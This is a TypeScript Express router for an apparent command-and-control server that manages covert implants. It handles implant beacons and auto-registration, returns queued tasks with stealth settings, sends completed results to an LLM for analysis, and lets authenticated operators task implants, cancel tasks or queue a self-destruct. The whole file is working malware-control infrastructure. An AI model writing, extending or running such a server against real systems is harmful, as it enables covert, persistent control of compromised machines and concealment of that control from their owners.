import { Router } from "express";
import { FleetRegistry } from "./fleet.js";
import { TaskQueue } from "./taskQueue.js";
import { authenticateOperator, authenticateImplant } from "./auth.js";
import { emitAlert } from "../../guard/alert.js";
import { logAudit } from "../../audit.js";
import { analyzeTaskResult } from "./analysis.js";
import type { ImplantHeartbeat, CreateTaskRequest, BeaconResponse } from "../types.js";
import type { BroadcastFn, WsEvent } from "./ws.js";

export function createRouter(
  registry: FleetRegistry,
  tasks: TaskQueue,
  apiKey: string,
  implantToken: string,
  broadcast?: BroadcastFn,
): Router {
  const router = Router();

  const opAuth = authenticateOperator(apiKey);
  const impAuth = authenticateImplant(implantToken);

  function emit(ev: WsEvent) {
    broadcast?.(ev);
  }

  // -----------------------------------------------------------------------
  // Implant-facing
  // -----------------------------------------------------------------------

  router.post("/api/v1/beacon", impAuth, (req, res) => {
    const hb = req.body as ImplantHeartbeat;

    // Auto-register if first beacon
    let implant = registry.get(hb.implantId);
    if (!implant) {
      registry.register({
        id: hb.implantId,
        name: hb.implantId,
        targetHost: "unknown",
        version: "1.0",
      });
      emitAlert("implant", `${hb.implantId} registered`, "info");
      logAudit({ timestamp: new Date().toISOString(), sessionId: "c2", action: "implant.register", target: hb.implantId, success: true, details: "first beacon" });
      emit({ type: "implant_registered", timestamp: new Date().toISOString(), data: { implantId: hb.implantId, profile: hb.profile } });
    } else {
      emit({ type: "implant_beacon", timestamp: new Date().toISOString(), data: { implantId: hb.implantId, status: hb.status, uptime: hb.uptime } });
    }

    // Update heartbeat
    const config = registry.heartbeat(hb.implantId, hb);
    if (!config) {
      res.status(404).json({ error: "implant not found" });
      return;
    }

    // Acknowledge pending results (mark tasks completed)
    for (const pr of hb.pendingResults ?? []) {
      const updated = tasks.complete(pr.taskId, { success: pr.success, data: pr.data, error: pr.error });
      const label = pr.success ? "completed" : "failed";
      emitAlert("task", `${pr.taskId.slice(0, 8)} ${label}`, pr.success ? "info" : "warning");
      logAudit({ timestamp: new Date().toISOString(), sessionId: "c2", action: `task.${label}`, target: pr.taskId, success: pr.success, details: pr.error });
      emit({
        type: pr.success ? "task_completed" : "task_failed",
        timestamp: new Date().toISOString(),
        data: { taskId: pr.taskId, implantId: hb.implantId, success: pr.success, error: pr.error },
      });
      // Fire-and-forget LLM analysis of result
      if (pr.success && updated) {
        analyzeTaskResult(updated).catch(() => {});
      }
    }

    // Poll for new tasks
    const taskAssignments = tasks.poll(hb.implantId);

    const response: BeaconResponse = {
      ackedResults: hb.pendingResults?.map((r) => r.taskId) ?? [],
      tasks: taskAssignments,
      config: {
        beaconInterval: config.beaconInterval,
        stealthConfig: config.stealthConfig,
      },
      command: "none",
    };

    res.json(response);
  });

  // -----------------------------------------------------------------------
  // Operator-facing (authenticated)
  // -----------------------------------------------------------------------

  /** List all implants. */
  router.get("/api/v1/operator/fleet", opAuth, (_req, res) => {
    res.json(registry.summary());
  });

  /** Get implant details. */
  router.get("/api/v1/operator/fleet/:id", opAuth, (req, res) => {
    const id = req.params.id as string;
    const implant = registry.get(id);
    if (!implant) { res.status(404).json({ error: "implant not found" }); return; }
    res.json(implant);
  });

  /** Create a task for an implant. */
  router.post("/api/v1/operator/task", opAuth, (req, res) => {
    const body = req.body as CreateTaskRequest;

    if (!body.implantId || !body.type) {
      res.status(400).json({ error: "implantId and type are required" });
      return;
    }

    const implant = registry.get(body.implantId);
    if (!implant) { res.status(404).json({ error: "implant not found" }); return; }

    const task = tasks.enqueue(body);
    emitAlert("task", `${task.taskId.slice(0, 8)} ${task.type} → ${task.implantId}`, "info");
    logAudit({ timestamp: new Date().toISOString(), sessionId: "c2", action: "task.create", target: task.taskId, success: true, details: `${task.type} → ${task.implantId}` });
    emit({ type: "task_created", timestamp: new Date().toISOString(), data: { taskId: task.taskId, implantId: task.implantId, type: task.type } });
    res.status(201).json(task);
  });

  /** List tasks, optional ?implant=X filter. */
  router.get("/api/v1/operator/tasks", opAuth, (req, res) => {
    const implantId = String(req.query.implant ?? "");
    const limit = parseInt(String(req.query.limit ?? "50"), 10) || 50;

    if (implantId) {
      res.json(tasks.list(implantId, limit));
    } else {
      res.json([]);
    }
  });

  /** Get task details. */
  router.get("/api/v1/operator/task/:id", opAuth, (req, res) => {
    const id = req.params.id as string;
    const task = tasks.get(id);
    if (!task) { res.status(404).json({ error: "task not found" }); return; }
    res.json(task);
  });

  /** Cancel a pending task. */
  router.delete("/api/v1/operator/task/:id", opAuth, (req, res) => {
    const id = req.params.id as string;
    const ok = tasks.cancel(id);
    emitAlert("task", `${id.slice(0, 8)} cancelled`, "info");
    logAudit({ timestamp: new Date().toISOString(), sessionId: "c2", action: "task.cancel", target: id, success: ok });
    emit({ type: "task_cancelled", timestamp: new Date().toISOString(), data: { taskId: id, success: ok } });
    res.json({ cancelled: ok });
  });

  /** Send self-destruct command to an implant. */
  router.post("/api/v1/operator/implant/:id/kill", opAuth, (req, res) => {
    const id = req.params.id as string;
    const task = tasks.enqueue({
      implantId: id,
      type: "self_destruct",
      params: {},
      priority: 99,
    });
    emitAlert("kill", `self-destruct queued for ${id}`, "warning");
    logAudit({ timestamp: new Date().toISOString(), sessionId: "c2", action: "implant.kill", target: id, success: true, details: `task: ${task.taskId}` });
    emit({ type: "implant_killed", timestamp: new Date().toISOString(), data: { implantId: id, taskId: task.taskId } });
    res.json({ taskId: task.taskId, message: "self-destruct queued" });
  });

  return router;
}
